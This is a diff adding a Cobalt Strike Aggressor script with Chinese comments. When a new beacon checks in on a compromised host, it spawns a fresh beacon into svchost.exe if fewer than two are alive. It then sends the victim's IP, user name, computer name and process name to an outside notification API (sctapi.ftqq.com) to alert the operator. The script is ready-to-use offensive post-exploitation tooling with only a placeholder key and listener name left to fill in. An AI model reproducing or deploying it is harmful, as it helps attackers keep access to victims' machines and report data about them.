@@ -1,0 +1,58 @@
+# Author: H0e4a0r1t
+
+# 循环获取所有beacon
+on beacon_initial {
+
+	sub http_get {
+        local('$output');
+        $url = [new java.net.URL: $1];
+        $stream = [$url openStream];
+        $handle = [SleepUtils getIOHandle: $stream, $null];
+
+        @content = readAll($handle);
+
+        foreach $line (@content) {
+            $output .= $line . "\r\n";
+        }
+
+        println($output);
+	 }    
+
+	$x = 0;
+	$internalIP = replace(beacon_info($1, "internal"), " ", "_");
+	foreach $bid (beacon_ids()) {
+		$inIP = replace(beacon_info($bid, "internal"), " ", "_");
+		$lastTime = replace(beacon_info($bid, "last"), " ", "_");
+		$userName = replace(beacon_info($1, "user"), " ", "_");
+		#可修改判断主机存活的心跳时长，默认为60S
+        if ($lastTime <= 60000){
+			if ($inIP == $internalIP) {
+				$x = $x + 1;
+			}
+			@ip[$x] = $inIP;
+			@last[$x] = $lastTime;
+			@un[$x] = $userName;
+		}
+
+	}
+    #可修改规定存活主机数量，默认为2
+	if ($x < 2){
+		#32位
+		#bspawnto($1, "x86", "%windir%\\syswow64\\svchost.exe");
+		#64位
+	    bspawnto($1, "x64", "%windir%\\sysnative\\svchost.exe");
+	    #将XXXX修改为监听器名称，后面的系统位数要保持一致
+	    bspawn($1, "XXXX", "x64");
+	    $internalIP0 = replace(beacon_info($1, "internal"), " ", "_");
+	    $userName0 = replace(beacon_info($1, "user"), " ", "_");
+	    $computerName0 = replace(beacon_info($1, "computer"), " ", "_");
+	    $process0 = replace(beacon_info($1, "process"), " ", "_");
+	    $url = 'https://sctapi.ftqq.com/XXXXXXXXXXXX(key).send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%E6%88%90%E5%8A%9F%EF%BC%81%0D%0A%0D%0AIP:'.$internalIP0.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName0.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName0.'%0D%0A%0D%0A%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0%EF%BC%9A'.$process0;
+        http_get($url);
+	}else{
+		println("该IP存活数量大于2！");
+		println("存活列表：\nIP: ".replace(@ip, "@", "")."\n心跳: ".replace(@last, "@", "")."\n用户名: ".replace(@un, "@", ""));
+   		
+	}
+	
+}
